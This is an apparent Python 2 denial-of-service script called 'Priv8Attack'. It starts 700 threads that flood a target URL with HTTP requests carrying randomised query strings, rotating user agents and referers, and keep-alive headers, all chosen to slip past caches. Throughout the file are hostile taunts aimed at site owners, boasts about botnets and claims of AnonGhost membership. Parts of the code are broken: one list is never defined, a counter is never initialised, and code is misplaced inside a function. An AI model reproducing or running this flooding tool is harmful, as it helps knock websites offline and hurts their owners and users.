#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
#5afc3c0f68ff47b53b485fcd53e898a9######---->Priv8Attack :(
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
#Allahu Akbar!#


import urllib2
import sys
import threading
import random
import re

#global params                                                                                       
url=''                                                                                              ###############################
host=''                                                                                             #~~~~Created Sniper-ums~~~~#
headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~#
headers_referers=[]                                                                                 #fb.com/profile.php?id=100006450001579#
flag=0                                                                                              #~~~~~Priv8Attack:@~~~~~~#
safe=0                                                                                              ###############################

def inc_counter():
	global request_counter
	request_counter+=45

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0 IceDragon/26.0.0.2')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')                                       ############################
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Pre-configured            #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #Botnets                   #
	headers_referers.append('http://www.google.com/?q=')                                       #Infected's Websites       #
	headers_referers.append('http://www.usatoday.com/search/results?q=')                       #Best's Shells Only        #
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by Hax Stroke#
	headers_referers.append('http://www.bing.com/search?q=')                                   #From AnonGhost Team       #
	headers_referers.append('http://search.yahoo.com/search?p=')                               ############################
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.lycos.com/web/?q=')
	headers_referers.append('http://busca.uol.com.br/web/?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.dmoz.org/search/search?q=')
	headers_referers.append('http://www.baidu.com.br/s?usm=1&rn=100&wd=')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('http://www.zhongsou.com/third?w=')
	headers_referers.append('http://hksearch.timway.com/search.php?query=')
	headers_referers.append('http://find.ezilon.com/search.php?q=')
	headers_referers.append('http://www.sogou.com/web?query=')
	headers_referers.append('http://api.duckduckgo.com/html/?q=')
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')

# generates a Keyword list	
def keyword_list():
        global keyword_top
        keyword_top.append('HaxStroke')
        keyword_top.append('Suicide')
        keyword_top.append('Sex')
        keyword_top.append('Robin Williams')
        keyword_top.append('World Cup')
        keyword_top.append('Ca Si Le Roi')
        keyword_top.append('Ebola')
        keyword_top.append('Malaysia Airlines Flight 370')
        keyword_top.append('ALS Ice Bucket Challenge')
        keyword_top.append('Flappy Bird')
        keyword_top.append('Conchita Wurst')
        keyword_top.append('ISIS')
        keyword_top.append('Frozen')
        keyword_top.append('014 Sochi Winter Olympics')
        keyword_top.append('IPhone')
        keyword_top.append('Samsung Galaxy S5')
        keyword_top.append('Nexus 6')
        keyword_top.append('Moto G')
        keyword_top.append('Samsung Note 4')
        keyword_top.append('LG G3')
        keyword_top.append('Xbox One')
        keyword_top.append('Apple Watch')
        keyword_top.append('Nokia X')
        keyword_top.append('Ipad Air')
        keyword_top.append('Facebook')
        keyword_top.append('Anonymous')
        keyword_top.append('DJ Bach')
        keyword_top.append('dos')
        keyword_top.append('attack')

	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 160)
		out_str += chr(a)
	return(out_str)

def usage():
	print 'Priv8Attack Version 1.0 DDoS Tool Created By Sniper-ums '
	print 'New loaded Botnets: 39,445,657'
	print 'Usage: SadAttack (url)'
	print 'Example: Priv8Attack.py http://website.com/'
	print "\a"
print \
"""                                                       
___     ___    _____ ______   ___    ___   _     
|   \   /   \  / ___/|      T /   \  /   \ | T    
|    \ Y     Y(   \_ |      |Y     YY     Y| |    
|  D  Y|  O  | \__  Tl_j  l_j|  O  ||  O  || l___ 
|     ||     | /  \ |  |  |  |     ||     ||     T
|     |l     ! \    |  |  |  l     !l     !|     |
l_____j \___/   \___j  l__j   \___/  \___/ l_____j
_________________________________________________________________

 _____      _        ___         _   _             _    
|  __ \    (_)      / _ \   /\  | | | |           | |   
| |__) | __ ___   _| (_) | /  \ | |_| |_ __ _  ___| | __
|  ___/ '__| \ \ / /> _ < / /\ \| __| __/ _` |/ __| |/ /
| |   | |  | |\ V /| (_) / ____ \ |_| || (_| | (__|   < 
|_|   |_|  |_| \_/  \___/_/    \_\__|\__\__,_|\___|_|\_\   
_________________________________________________________________                                                           
"""

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(50,100)))
	request.add_header('Keep-Alive', random.randint(110,160))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print '                                                                    '
 			print '#~~~~~~> Belong your database <~~~~~#~~~~~~~~~>Hello admin<~~~~~~~~#'
 			print '#~~~~~~> Fuck your Firewall <~~~~~~~#~~~~>your website is down<~~~~#'
 			print '#~~~> Your website will be down <~~~#~~~>By Priv8Attack Mass DDoS<~~~#'
 			print '                                                                    '
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+150<request_counter) & (previous<>request_counter):
				print "#~~~>Priv8Attack DDoS Attack's Sended: %d Sending more<~~~#" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n ~>Stopping the mass DDoS Attack<~"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "Starting the Priv8Attack in webserver Priv8 DDoS Tool"
		print "Created By sniper-ums"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(700):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()

####################################->
#4312644bf54db17180c8a95add9fdc06####-->uauauauauauauau
#9dfb17e500b557a9d985c08da4fd0aaf#####--->We will fuck your site D:
#5afc3c0f68ff47b53b485fcd53e898a9######---->Priv8Attack :(
#ff46a6b3100d11c29d4233c72f604a10#####--->uauauauauauau
#6e70e3b1bf171ae14505f4f8b0dc4e5a####-->
####################################->
